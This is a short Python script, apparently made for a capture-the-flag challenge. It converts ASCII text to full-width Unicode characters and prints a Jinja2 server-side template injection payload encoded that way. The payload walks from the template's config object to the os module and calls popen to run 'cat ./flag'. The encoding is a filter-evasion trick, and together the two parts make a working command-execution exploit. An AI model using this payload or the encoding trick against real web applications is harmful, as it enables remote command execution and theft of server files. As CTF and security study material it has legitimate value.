def convert_full_witdh_char(line):

    def convert(x):
        unicode_x = ord(x)
        if 0x21 <= unicode_x <= 0x7E:  # [A-Za-z0-9!"#$%&'()*+,./:;<=>?@\^_`{|}~-]
            return chr(unicode_x + 0XFEE0)
        elif unicode_x == 0x20:  ## space
            return chr(0x3000)
        else:
            return x

    full_width_ch = [convert(x) for x in line]
    return ''.join(full_width_ch)


print(convert_full_witdh_char("{{ config.__class__.__init__.__globals__[\"os\"].popen('cat ./flag').read() }}"))